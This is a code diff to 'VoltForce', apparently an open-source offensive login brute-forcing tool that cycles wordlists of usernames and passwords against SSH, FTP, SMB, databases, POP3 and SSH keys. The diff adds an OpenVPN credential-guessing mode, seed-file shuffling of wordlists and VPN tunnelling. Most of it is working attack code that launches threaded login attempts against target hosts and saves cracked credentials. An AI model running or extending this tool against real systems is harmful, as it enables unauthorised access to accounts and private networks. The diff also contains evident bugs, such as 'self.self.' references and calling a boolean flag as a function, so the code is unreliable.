@@ -6,7 +6,7 @@ import argparse
 import socket
 import datetime
 from ftplib import FTP,error_perm, error_temp, error_reply
-from impacket.smbconnection import SMBConnection # Windows defender may block this library
+#from impacket.smbconnection import SMBConnection # Windows defender may block this library
 import telnetlib3
 import pymysql
 import psycopg2
@@ -20,6 +20,7 @@ from tqdm import tqdm
 import socks
 from random import SystemRandom,shuffle,seed
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from openvpnclient import OpenVPNClient
 import asyncio
 
 init(autoreset=True)
@@ -60,6 +61,7 @@ class VoltForce:
                 is_shuffle=False,
                 shuffle_count=10,
                 shuffle_seed=False,
+                shuffle_seeds_file=[],
                 quiet=False,
                 banner=False,
                 save_results=False,
@@ -75,7 +77,17 @@ class VoltForce:
                 min_length_password = False,
                 max_length_password = False,
                 no_duplicates=False,
-                delay_between=0
+                delay_between=0,
+
+                open_vpn_config_file=None,
+                open_vpn_username=None,
+                open_vpn_password=None,
+                open_vpn_connect=None,
+
+                open_vpn_config_file_wordlist=None,
+                open_vpn_usernames_wordlist=None,
+                open_vpn_passwords_wordlist=None,
+
                                 ):
         
         self.target_host = target_host
@@ -113,7 +125,21 @@ class VoltForce:
 
         self.is_shuffle = is_shuffle
         self.shuffle_count = shuffle_count
-        self.shuffle_seed = shuffle_seed
+        self.shuffle_seed = [shuffle_seed]
+        self.shuffle_seeds_file = shuffle_seeds_file
+        self.shuffle_seeds_file_path = shuffle_seeds_file
+
+        if self.shuffle_seeds_file == None:
+
+            pass
+
+        else:
+
+            with open(self.shuffle_seeds_file, "r") as f:
+
+                self.shuffle_seeds_file = [int(line.rstrip()) for line in f.readlines()]
+                self.shuffle_seed = self.shuffle_seeds_file
+
 
         self.quiet = quiet
         self.banner = banner
@@ -168,46 +194,19 @@ class VoltForce:
 
 
 
-        if self.general_wordlist:
-
-            with open(self.general_wordlist, "r") as f:
-                for line in f:
-                    if ":" in line:
-                        user, password = line.strip().split(":", 1)
-                        self.usernames_list.append(user)
-                        self.passwords_list.append(password)
 
 
 
+        if self.check_general():
 
-
-
-        if self.single_password:
-            self.passwords_list = [self.single_password]
-            self.passwords_list_path = f"single: {self.single_password}"
-
-        elif passwords_list is not None:
-            with open(passwords_list, "r") as f:
-                self.passwords_list = [line.rstrip() for line in f.readlines()]
-            self.passwords_list_path = passwords_list
+            pass
 
         else:
-            self.passwords_list = []
-            self.passwords_list_path = None
 
-        if self.single_username:
-            self.usernames_list = [self.single_username]
-            self.usernames_list_path = f"single: {self.single_username}"
+            self.load_data()
 
-        elif usernames_list is not None:
-
-            with open(usernames_list, "r") as f:
-                self.usernames_list = [line.rstrip() for line in f.readlines()]
-            self.usernames_list_path = usernames_list
-
-        else:
-            self.usernames_list = []
-            self.usernames_list_path = None
+            
+        
 
         self.max_retries = max_retries
         self.total_connections = 0
@@ -258,6 +257,19 @@ class VoltForce:
         self.host_locks = {host: threading.Lock() for host in self.hosts}
         self.host_last_attempt = {host: 0 for host in self.hosts}
 
+        self.open_vpn_client = None
+
+        self.open_vpn_config_file=open_vpn_config_file
+        self.open_vpn_username=open_vpn_username
+        self.open_vpn_password=open_vpn_password
+        self.open_vpn_connect=open_vpn_connect
+        self.open_vpn_config_file_wordlist=open_vpn_config_file_wordlist
+        self.open_vpn_usernames_wordlist=open_vpn_usernames_wordlist
+        self.open_vpn_passwords_wordlist=open_vpn_passwords_wordlist
+        self.self.open_vpn_config_file_path = None
+        self.self.passwords_list_path = None
+        self.load_open_vpn_data()
+
 
     
         if self.max_time:
@@ -275,8 +287,10 @@ class VoltForce:
                       "redis" : self.brute_redis,
                       "mongodb" : self.brute_mongodb,
                       "pop3" : self.brute_pop3,
-                      "ssh-key" : self.brute_ssh_with_keys         
-                      }
+                      "ssh-key" : self.brute_ssh_with_keys,
+                      "openvpn" : self.brute_open_vpn
+
+        }
         
         if self.passwords_list is None:
             self.passwords_list = []
@@ -305,7 +319,7 @@ class VoltForce:
         self.title = rf"""
  _    __      ____     ______                   
 | |  / /___  / / /_   / ____/___  _____________  Made by Vesel4ak31 
-| | / / __ \/ / __/  / /_  / __ \/ ___/ ___/ _ \ Version 1.0
+| | / / __ \/ / __/  / /_  / __ \/ ___/ ___/ _ \ Version 1.1
 | |/ / /_/ / / /_   / __/ / /_/ / /  / /__/  __/ Github: https://github.com/Vesel4ak31/VoltForce
 |___/\____/_/\__/  /_/    \____/_/   \___/\___/  Versatile Offensive Login Tool (VOLT)
                                                 
@@ -346,6 +360,154 @@ class VoltForce:
         with self.output_lock:
             print(message)
 
+
+    def load_open_vpn_data(self) -> bool:
+
+        if self.open_vpn_config_file:
+
+            self.self.open_vpn_config_file_path = self.self.open_vpn_config_file
+
+            with open(self.open_vpn_config_file, "r") as f:
+
+                
+                self.open_vpn_config_file_wordlist = [line.rstrip() for line in f.readlines()]
+                
+
+
+        elif self.open_vpn_config_file_wordlist is not None:
+
+            self.passwords_list_path = self.open_vpn_config_file_wordlist
+            with open(self.open_vpn_config_file_wordlist, "r") as f:
+
+
+                self.open_vpn_config_file_wordlist = [line.rstrip() for line in f.readlines()]
+            
+
+        
+        else:
+
+            self.open_vpn_config_file = None
+            self.open_vpn_config_file_wordlist = ["1"]
+
+
+
+        if self.open_vpn_password:
+                
+                self.passwords_list = [self.open_vpn_password]
+                self.passwords_list_path = f"single: {self.open_vpn_password}"
+
+        elif self.open_vpn_passwords_wordlist is not None:
+                
+            with open(self.open_vpn_passwords_wordlist, "r") as f:
+
+                self.passwords_list = [line.rstrip() for line in f.readlines()]
+            self.passwords_list_path = self.open_vpn_passwords_wordlist
+
+        else:
+
+            self.passwords_list = []
+            self.passwords_list_path = None
+
+            
+            
+        if self.open_vpn_username:
+                
+            self.usernames_list = [self.open_vpn_username]
+            self.usernames_list_path = f"single: {self.open_vpn_username}"
+
+        elif self.open_vpn_usernames_wordlist is not None:
+
+            with open(self.open_vpn_usernames_wordlist, "r") as f:
+
+                self.usernames_list = [line.rstrip() for line in f.readlines()]
+            self.usernames_list_path = self.self.open_vpn_usernames_wordlist
+
+        else:
+
+            self.usernames_list = []
+            self.usernames_list_path = None
+
+        return True
+
+
+    def load_data(self) -> None:
+
+        if self.single_password:
+                self.passwords_list = [self.single_password]
+                self.passwords_list_path = f"single: {self.single_password}"
+
+        elif self.passwords_list is not None:
+                
+            with open(self.passwords_list, "r") as f:
+
+                self.passwords_list = [line.rstrip() for line in f.readlines()]
+            self.passwords_list_path = self.passwords_list
+
+        else:
+
+            self.passwords_list = []
+            self.passwords_list_path = None
+
+            
+            
+        if self.single_username:
+                
+            self.usernames_list = [self.single_username]
+            self.usernames_list_path = f"single: {self.single_username}"
+
+        elif self.usernames_list is not None:
+
+            with open(self.usernames_list, "r") as f:
+                self.usernames_list = [line.rstrip() for line in f.readlines()]
+            self.usernames_list_path = self.usernames_list
+
+        else:
+
+            self.usernames_list = []
+            self.usernames_list_path = None
+
+
+    def connect_open_vpn(self) -> bool:
+
+        if self.open_vpn_connect:
+
+            self.open_vpn_client = OpenVPNClient(
+
+                config_path=self.open_vpn_config_file,
+                username=self.open_vpn_username,
+                password = self.open_vpn_password
+            )
+
+            self.open_vpn_client.connect()
+
+            if self.open_vpn_client.is_connected():
+
+                self.safe_print(self.render_text("VPN",Style.BRIGHT + Fore.GREEN,f"OpenVPN connection successfully established: {self.open_vpn_username}:{self.open_vpn_password} ( {self.open_vpn_config_file} )"))
+                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN CONNECTION] [{self.mode.upper()}] OpenVPN connection successfully established: {self.open_vpn_username}:{self.open_vpn_password} ( {self.open_vpn_config_file} )")
+                return True
+            
+            
+        return False
+
+
+
+
+        
+    def check_general(self) -> bool:
+
+        if self.general_wordlist:
+
+            with open(self.general_wordlist, "r") as f:
+                for line in f:
+                    if ":" in line:
+                        user, password = line.strip().split(":", 1)
+                        self.usernames_list.append(user)
+                        self.passwords_list.append(password)
+
+            return True
+        
+        return False
+
     def check_flags(self,connection : any, close_connector : any) -> bool:
 
         self.success_exit()
@@ -375,7 +537,7 @@ class VoltForce:
 
 
 
-    def make_worker(self, host: str, user: str, password: str):
+    def make_worker(self, host: str, user: str, password: str,file):
 
         if self.stoping_event.is_set():
 
@@ -392,7 +554,7 @@ class VoltForce:
                 self.host_last_attempt[host] = time.time()
 
         if self.mode.rstrip().lower() in self.modes:
-            self.modes[self.mode](host, user, password)
+            self.modes[self.mode](host, user, password,file)
 
 
     def execute_command(self,connection : any,command : str) -> str:
@@ -627,7 +789,7 @@ class VoltForce:
             self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] Maximum number of reconnections reached: {self.max_retries}")
             os._exit(0)
 
-    def brute_ssh(self,host : str,user : str,password : str) -> bool:
+    def brute_ssh(self,host : str,user : str,password : str, file: str) -> bool:
         self.update()
 
         if self.stoping_event.is_set():
@@ -680,7 +842,7 @@ class VoltForce:
     
 
         
-    def brute_ftp(self,host : str,user : str,password : str) -> bool:
+    def brute_ftp(self,host : str,user : str,password : str, file: str) -> bool:
         self.update()
 
         if self.stoping_event.is_set():
@@ -771,7 +933,7 @@ class VoltForce:
                 
 
 
-    def brute_smb(self,host : str,user : str,password : str) -> bool:
+    def brute_smb(self,host : str,user : str,password : str, file: str) -> bool:
         self.update()
 
         if self.stoping_event.is_set():
@@ -839,7 +1001,7 @@ class VoltForce:
 
                     
                     
-    def brute_telnet(self, host: str, user: str, password: str) -> bool:
+    def brute_telnet(self, host: str, user: str, password: str, file: str) -> bool:
 
         if self.stoping_event.is_set():
 
@@ -924,7 +1086,7 @@ class VoltForce:
 
 
 
-    def brute_mysql(self,host : str,user : str,password : str) -> bool:
+    def brute_mysql(self,host : str,user : str,password : str, file: str) -> bool:
         self.update()
 
         if self.stoping_event.is_set():
@@ -1008,7 +1170,7 @@ class VoltForce:
 
 
 
-    def brute_postgres(self,host : str,user : str,password : str) -> bool:
+    def brute_postgres(self,host : str,user : str,password : str, file: str) -> bool:
         
         self.update()
 
@@ -1103,7 +1265,7 @@ class VoltForce:
 
 
 
-    def brute_redis(self,host : str, user : str,password : str) -> bool:
+    def brute_redis(self,host : str, user : str,password : str, file: str) -> bool:
         
         self.update()
 
@@ -1171,7 +1333,7 @@ class VoltForce:
 
         
 
-    def brute_mongodb(self,host : str,user : str,password : str) -> bool:
+    def brute_mongodb(self,host : str,user : str,password : str, file: str) -> bool:
         
         self.update()
 
@@ -1252,7 +1414,7 @@ class VoltForce:
         
 
 
-    def brute_pop3(self,host : str,user : str,password : str) -> bool:
+    def brute_pop3(self,host : str,user : str,password : str, file: str) -> bool:
         
         self.update()
 
@@ -1325,7 +1487,7 @@ class VoltForce:
 
 
 
-    def brute_ssh_with_keys(self,host : str,user : str,key : str) -> bool:
+    def brute_ssh_with_keys(self,host : str,user : str,key : str, file: str) -> bool:
 
         try:
 
@@ -1369,6 +1531,45 @@ class VoltForce:
             if self.ssh_client:
                 self.ssh_client.close()
 
+        
+    def brute_open_vpn(self,host : str,user : str,password : str, file: str):
+
+        try:
+
+            if self.stoping_event.is_set():
+                        return False
+
+
+            self.open_vpn_client = OpenVPNClient(
+
+                    config_path=file,
+                    username=user,
+                    password =password,
+                )
+
+            self.open_vpn_client.connect()
+            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing OpenVPN credentials: {user}:{password} (config: {file} )")
+            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing OpenVPN credentials: {user}:{password} (config: {file} )"))
+
+            if self.open_vpn_client.is_connected():
+
+                
+
+                self.stoping_event.set()
+                self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"OpenVPN credentials found: {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password} (config: {Style.BRIGHT + Fore.GREEN + f"{file}"})"))
+                self.success_exit()
+                self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] OPENVPN CREDENTIALS FOUND {user}:{password} (config: {file})")
+                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] OPENVPN CREDENTIALS FOUND {user}:{password} (config: {file})")
+
+            self.total_connections +=1
+
+        except Exception as e:
+
+            self.safe_print(self.render_text("VPN",Back.RED,f"OpenVPN error: {e}"))
+            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN ERROR] [{self.mode.upper()}] OpenVPN error: {e}")
+            
+        
+
 
     
 
@@ -1387,7 +1588,8 @@ class VoltForce:
         except Exception:
             return False
         
-        
+    
+   
        
     def main(self):
             
@@ -1470,11 +1672,11 @@ class VoltForce:
                     time.sleep(self.get_timeout())
 
 
-                if self.shuffle_seed:
+                if len(self.shuffle_seed) ==1:
                     
-                    seed(self.shuffle_seed)
+                    seed( int(self.shuffle_seed[0]) )
                     print(self.render_text("SEED", Style.BRIGHT + Fore.CYAN, f"new seed installed: {self.shuffle_seed}"))
-                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SEED] [{self.mode.upper()}] new seed installed: {self.shuffle_seed}")
+                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SEED] [{self.mode.upper()}] new seed installed: {self.shuffle_seed[0]}")
                     time.sleep(self.get_timeout())
 
                 if self.is_shuffle:
@@ -1486,25 +1688,39 @@ class VoltForce:
                     if self.shuffle_count < 1:
                         self.shuffle_count = 1
 
+                    if len(self.shuffle_seed) !=1:
+                    
+                        print(self.render_text("SEED", Style.BRIGHT + Fore.CYAN, f"shuffling the wordlist based on seeds from the file: {self.shuffle_seeds_file_path}"))
+                        self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SEED] [{self.mode.upper()}] shuffling the wordlist based on seeds from the file: {self.shuffle_seeds_file_path}")
+                        time.sleep(self.get_timeout())
+
                     for _ in range(self.shuffle_count):
 
-                        shuffle(self.usernames_list)
-                        shuffle(self.passwords_list)
+                        for s in self.shuffle_seed:
+
+                            seed(s)
+                            shuffle(self.usernames_list)
+                            shuffle(self.passwords_list)
 
                 if self.socks5_address and self.socks5_port:
                     print(self.render_text("INF",Style.BRIGHT + Fore.GREEN, f"socks5 proxy enabled: {self.socks5_address}:{self.socks5_port} ({self.socks5_username}:{self.socks5_password})"))
                     self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] SOCKS5 proxy enabled: {self.socks5_address}:{self.socks5_port} ({self.socks5_username}:{self.socks5_password})")
                     time.sleep(self.get_timeout())
 
+                self.open_vpn_connect()
+
                 self.tasks = []
                 for host in self.hosts:
 
                     print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"testing host: {host}"))
                     self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] testing host: {host}")
-                    
-                    for user in self.usernames_list:
-                        for password in self.passwords_list:
-                            self.tasks.append((host, user, password))
+                
+
+                    for file in self.open_vpn_config_file_wordlist:
+
+                        for user in self.usernames_list:
+                            for password in self.passwords_list:
+                                self.tasks.append((host, user, password,file))
 
                 print(self.render_text("INF", Style.BRIGHT + Fore.GREEN, f"starting {self.threads} threads..."))
                 self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] starting {self.threads} threads...")
@@ -1514,7 +1730,7 @@ class VoltForce:
 
                 with ThreadPoolExecutor(max_workers=self.threads) as executor:
 
-                    self.futures = [executor.submit(self.make_worker, h, u, p) for h, u, p in self.tasks]
+                    self.futures = [executor.submit(self.make_worker, h, u, p,f) for h, u, p,f in self.tasks]
                     
                     if self.progress_bar:
                         with tqdm(total=len(self.tasks), colour="blue", desc="Brute forcing", unit="attempt", dynamic_ncols=True) as pbar:
@@ -1550,6 +1766,23 @@ class VoltForce:
             
             finally:
 
+                if self.open_vpn_connect:
+
+                    try:
+
+                        if self.open_vpn_client:
+
+                            self.open_vpn_client.disconnect()
+                            self.safe_print(self.render_text("VPN",Style.BRIGHT + Fore.GREEN,f"OpenVPN connection successfully terminated"))
+                            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN CONNECTION] [{self.mode.upper()}] OpenVPN connection successfully terminated")
+
+
+                    except Exception as e:
+
+                        self.safe_print(self.render_text("VPN",Back.RED,f"OpenVPN error: {e}"))
+                        self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [VPN ERROR] [{self.mode.upper()}] OpenVPN error: {e}")
+
+
 
 
                 if self.timer and self.start_timer is not None:
@@ -1581,6 +1814,9 @@ if __name__ == "__main__":
     parser.add_argument("-shu","--shuffle", action="store_true", help="Shuffle wordlists before starting")
     parser.add_argument("-shuc","--shuffle-count", type=int, default=10, help="This flag controls how many times to mix the password. By default, VoltForce mixes passwords 10 times, but you can change this value using this flag. The more times you mix the passwords, the higher the entropy level will be.")
     parser.add_argument("--seed","--shuffle-seed", type=int, help="A flag is used to specify a custom seed for shuffling. Specify an integer, and shuffling will work the same way. If your integer (seed) doesn't change, the shuffling result won't change either. The flag is needed either to uniquely arrange the wordlist. Therefore, if your seed won't change, there's no point in shuffling the wordlist more than once. Use the flag only for unambiguous shuffling. If you specify an insufficiently unique number, the shuffling can be predicted. Use the flag at your own risk and only if you are absolutely certain of the uniqueness of your seed.")
+    
+    parser.add_argument("-ssf", "--shuffle-seeds-file", type=str, help="This flag is needed to specify a file in which the natural numbers used as seeds for shuffling the dictionary will be written line by line.") 
+    
     parser.add_argument("-q","--quiet", action="store_true", help="Disables all console output. VoltForce won't notify you of any messages, but this mode enables logging, and all data will be written there.")
     parser.add_argument("-b","--banner", action="store_true", help="Show banner and exit")
     parser.add_argument("-thr", "--threads", type=int,default=5,help="The number of threads to be checked. The higher the number of threads, the more noise and activity will be in the logs, and the more load you will place on your operating system. The initial value is 10 threads.") 
@@ -1598,7 +1834,7 @@ if __name__ == "__main__":
     parser.add_argument("-so", "--success-only",  action="store_true" ,help="This flag is used to output only successful data search attempts to the console. If you specify this flag, Volt Force will not display any messages about testing any credentials. If you specify this flag, the program may appear to hang. However, the brute-force process will still continue.") 
     parser.add_argument("-mt", "--max-time",type=float, help="Maximum operating time") 
     parser.add_argument("-nc", "--no-color", action="store_true", help="Color output will be disabled") 
-    parser.add_argument("-m", "--mode",choices=["ssh", "ftp","smb","telnet", "mysql","postgres","redis","mongodb", "pop3","ssh-key"] , type=str , default="ssh" , help="The tool's operating mode. By default, the search mode is SSH.") 
+    parser.add_argument("-m", "--mode",choices=["ssh", "ftp","smb","telnet", "mysql","postgres","redis","mongodb", "pop3","ssh-key","openvpn"] , type=str , default="ssh" , help="The tool's operating mode. By default, the search mode is SSH.") 
     parser.add_argument("--log-mode", choices=["w", "a"], default="a", help="Log mode: w = overwrite, a = append") 
     parser.add_argument("-H", "--hosts-list", type=str, help="list of hosts in the file. To specify targets. Hosts should be specified in a column.") 
     parser.add_argument("-sk","--ssh-key", type=str , help="This flag is used to specify the SSH authorization key. You only need to specify the path to the key file. You must also select the ssh-key mode using the --mode flag. This flag will only use one key. For brute-force attacks, use the --keys-list flag. If you want to use a brute-force attack on keys, you don't need to specify a password list. VoltForce will fill them in automatically, so you don't need to specify them. Simply specify the --ssh-key flag.")
@@ -1618,6 +1854,15 @@ if __name__ == "__main__":
     parser.add_argument("--max-length-password", type=int, help="Maximum password length to try")
     parser.add_argument("-nd","--no-duplicates", action="store_true", help="Remove duplicate entries from wordlists")
     parser.add_argument("-db","--delay-between", type=float, default=0, help="Delay between attempts on the same host (seconds)")
+
+    parser.add_argument("-vf","-ovcf", "--open-vpn-config-file", type=str, help="This flag is used to specify the configuration file for connecting via OpenVPN. You can use it to bruteforce OpenVPN or to connect to the VPN itself. Specify the path to the configuration file. If you don't want to bruteforce OpenVPN but want to connect to it, be sure to include the --open-vpn-connect flag.") 
+    parser.add_argument("-vu","-ovu", "--open-vpn-username", type=str, help="This flag is used to specify the username when connecting to OpenVPN or brute-forcing it. You can use it for both brute-forcing and connecting to the VPN itself. Specify the username. If you don't want to brute-force OpenVPN but want to connect to it, be sure to use the --open-vpn-connect flag.") 
+    parser.add_argument("-vp","-ovp", "--open-vpn-password", type=str, help="This flag is used to specify a password when connecting to OpenVPN or brute-forcing it. You can use it both for brute-forcing and for the connection itself. Specify the password for access. If you don't want to brute-force OpenVPN but plan to connect to it, be sure to use the --open-vpn-connect flag.") 
+    parser.add_argument("-vc","-ovc", "--open-vpn-connect", action="store_true", help="This flag is required to confirm the OpenVPN connection. If you've entered all the required login information, VoltForce will attempt to register to establish a connection. This flag only serves as confirmation that you want to bruteforce via the VPN.") 
+    
+    parser.add_argument("-cw","-ovcfw", "--open-vpn-config-file-wordlist", type=str, help="This flag specifies the path to a file containing, in columns, target configuration files for testing private network login credentials. If you want to use only one configuration file, use the --open-vpn-config-file flag.") 
+    parser.add_argument("-uw","-ovuw", "--open-vpn-usernames-wordlist", type=str, help="This flag specifies the path to a file containing usernames in a column for testing private network login credentials. If you want to use only one username, use the --open-vpn-username flag. The username value is equivalent to the --usernames-wordlist flag. You can also specify this flag if you prefer.") 
+    parser.add_argument("-pw","-ovpw", "--open-vpn-passwords-wordlist", type=str, help="This flag specifies the path to a file containing a column of passwords for testing private network login credentials. If you want to use only one password, use the --open-vpn-password flag. The value of this password is equivalent to the --passwords-wordlist flag. You can also specify this flag if you prefer.") 
 
     args = parser.parse_args()
 
@@ -1665,6 +1910,7 @@ if __name__ == "__main__":
         delay=args.delay,
         is_shuffle=args.shuffle,
         shuffle_count=args.shuffle_count,
+        shuffle_seeds_file=args.shuffle_seeds_file,
         shuffle_seed=args.seed,
         quiet=args.quiet,
         banner=args.banner,
@@ -1681,7 +1927,16 @@ if __name__ == "__main__":
         min_length_password = args.min_length_password,
         max_length_password = args.max_length_password,
         no_duplicates = args.no_duplicates,
-        delay_between = args.delay_between
+        delay_between = args.delay_between,
+
+        open_vpn_config_file=args.open_vpn_config_file,
+        open_vpn_username=args.open_vpn_username,
+        open_vpn_password=args.open_vpn_password,
+        open_vpn_connect=args.open_vpn_connect,
+
+        open_vpn_config_file_wordlist=args.open_vpn_config_file_wordlist,
+        open_vpn_usernames_wordlist=args.open_vpn_usernames_wordlist,
+        open_vpn_passwords_wordlist=args.open_vpn_passwords_wordlist,
 
 
 
